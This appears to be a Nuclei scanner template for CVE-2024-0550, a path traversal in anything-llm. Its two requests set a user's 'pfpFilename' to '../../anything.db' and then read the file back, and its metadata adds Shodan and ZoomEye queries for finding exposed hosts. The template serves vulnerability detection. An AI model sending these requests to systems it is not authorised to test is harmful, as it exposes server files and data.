http:
- body: '{"pfpFilename":"../../anything.db"}'
  headers:
    Authorization: Bearer {{auth_token}}
    Content-Type: text/plain;charset=UTF-8
    Origin: '{{BaseURL}}'
    Referer: '{{BaseURL}}/settings/users'
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
  method: POST
  path:
  - '{{BaseURL}}/api/admin/user/{{user_id}}'
- headers:
    Authorization: Bearer {{auth_token}}
    Content-Type: text/plain;charset=UTF-8
    Origin: '{{BaseURL}}'
    Referer: '{{BaseURL}}/settings/users'
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
  matchers:
  - status:
    - 200
    type: status
  method: GET
  path:
  - '{{BaseURL}}/api/system/pfp/{{user_id}}'
id: CVE-2024-0550
info:
  author: VulnSphere
  classification:
    cve-id: CVE-2024-0550
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 9.6
    cwe-id: CWE-23
  description: 'The anything-llm application is vulnerable to a path traversal and
    arbitrary file read vulnerability. An attacker can exploit this vulnerability
    by sending a crafted request to the "/api/admin/user/<user_id>" endpoint, allowing
    them to read sensitive files on the server.


    The vulnerability is caused by insufficient input validation and improper handling
    of the "pfpFilename" parameter in the request body. By sending a specially crafted
    value with directory traversal sequences, an attacker can bypass intended access
    restrictions and read arbitrary files on the server.

    '
  impact: 'Successful exploitation of this vulnerability could lead to unauthorized
    disclosure of sensitive information, such as application source code, configuration
    files, or user data. This could potentially enable further attacks and system
    compromises.

    '
  metadata:
    max-request: 2
    product: anything-llm
    shodan-query: http.html:"anything-llm"
    vendor: anything-llm
    verified: true
    zoomeye-query: title:"anything-llm"
  name: anything-llm - Path Traversal and Arbitrary File Read
  reference:
  - https://huntr.com/bounties/c6afeb5e-f211-4b3d-aa4b-6bad734217a6
  - https://github.com/mintplex-labs/anything-llm/commit/e1dcd5ded010b03abd6aa32d1bf0668a48e38e17
  remediation: '- Update the application to a patched version that addresses this
    vulnerability.

    - Implement proper input validation and sanitization mechanisms for user-supplied
    data.

    - Restrict access to sensitive files and directories by following the principle
    of least privilege.

    - Regularly review and update the application''s security posture.

    '
  severity: Critical
  tags: cve,cve2024,pathtraversal,lfi,anything-llm
